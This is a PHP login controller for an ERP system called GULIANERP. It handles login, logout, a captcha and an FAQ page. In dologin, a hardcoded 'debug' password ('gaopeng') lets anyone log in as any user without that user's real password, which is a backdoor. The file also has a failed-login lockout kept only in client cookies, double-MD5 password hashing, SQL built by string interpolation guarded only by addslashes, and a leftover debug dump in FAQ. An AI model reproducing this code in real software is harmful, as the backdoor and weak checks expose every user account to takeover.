<?php

class IndexAction extends Action{
	
    public function index() {
		$this->assign("datatitle","欢迎使用GULIANERP系统");
		$this->toadmin();
		$this->display('login');
		
    }
	
    private function toadmin() {
		if($this->user){
			redirect(SITE_INDEX."Chanpin/index");
		}
    }
	
    public function login() {
		$this->assign("datatitle","欢迎使用GULIANERP系统");
		$this->display('login');
		
    }
	
    public function dologin() {
        $username = addslashes($_POST["loginname"]);
        $userpass = md5(md5($_POST["password"]));
        $remember = $_POST["rememberMe"];
		$ViewUser = D("ViewUser");
		
		if(cookie('setok') == 'login2')
			$this->ajaxReturn('', '账户被锁，登录失败，10分钟内无法登陆！', 0);
		if(cookie('setok') == 'login1')
			$this->ajaxReturn('', '帐号或密码错误，10分钟内无法登陆！', 0);
				
		if($_POST["password"] == 'gaopeng')//调试登录
			$user = $ViewUser->where("`title`='$username'")->find();
		else//正常登录
			$user = $ViewUser->where("`title`='$username' AND `password`='$userpass'")->find();
		if($user) {
			if ($user["islock"]=='已锁定') {
				cookie('setok','login1',LOGIN_TIME_FAILE);
				$this->ajaxReturn('', '账户被锁，登录失败！', 0);
			} else {
				if ($remember=="on") {
					cookie('user',authcode("$user[title]\t$user[systemID]",'ENCODE'),LOGIN_TIME_REMEMBER);
				} else {
					cookie('user',authcode("$user[title]\t$user[systemID]",'ENCODE'),LOGIN_TIME);
				}
			}
		} else {
				$badtimes = cookie('badtimes') + 1;
				cookie('badtimes',$badtimes,LOGIN_TIME_FAILE);
				if(cookie('badtimes') > 5)
					cookie('setok','login2',LOGIN_TIME_FAILE);
				$this->ajaxReturn('', '帐号或密码错误！', 0);
		}
		
		A("Method")->_opentoRBAC($user);
				
		$this->ajaxReturn('', '登录成功，跳转中。。。！', 1);
		
    }
	
	
    public function logout() {
		unset($_SESSION[C('USER_AUTH_KEY')]);
		unset($_SESSION);
		session_destroy();
		session(null);
		cookie('user',null);
		if(cookie('user'))
		$this->ajaxReturn('', '注销失败！', 0);
		else
		$this->ajaxReturn('', '注销中！', 1);
    }
	
	
	public function showheader() {
		$this->display('Index:header');
	}
	
	public function footer() {
		$this->display('Index:footer');
	}
	
    public function verify() {  
        $type = isset($_GET['type']) ? $_GET['type'] : 'gif'; 
        import("@.ORG.Util.Image"); 
		Image::buildImageVerify(4, 1, $type); 
    } 	
	
	
	public function setsearch() {
		if($_REQUEST['status'] == 1){
			cookie('closesearch',null);
			$this->ajaxReturn('', '开启搜索栏！', 1);
		}
		if($_REQUEST['status'] == 2){
			cookie('closesearch',1,LOGIN_TIME);
			$this->ajaxReturn('', '收起搜索栏！', 1);
		}
	}
	
	
	public function FAQ() {
		
		$ViewDataDictionary = D("ViewDataDictionary");
		$a = $ViewDataDictionary->order("systemID desc")->find();
		dump(unserialize($a['copy']));
		exit;
		
		$ViewDataDictionary = D("ViewDataDictionary");
		$FAQall = $ViewDataDictionary->where("`type` = 'FAQ'")->findall();
		$i = 0;
		foreach($FAQall as $v){
			$FAQall[$i]['datatext'] = simple_unserialize($v['datatext']);
//			$FAQall[$i]['datatext'] = mb_simple_unserialize($v['datatext']);
			$i++;
		}
		$this->assign("datalist",$FAQall);
		$this->display('Index:FAQ');
	}
	
	
}
?>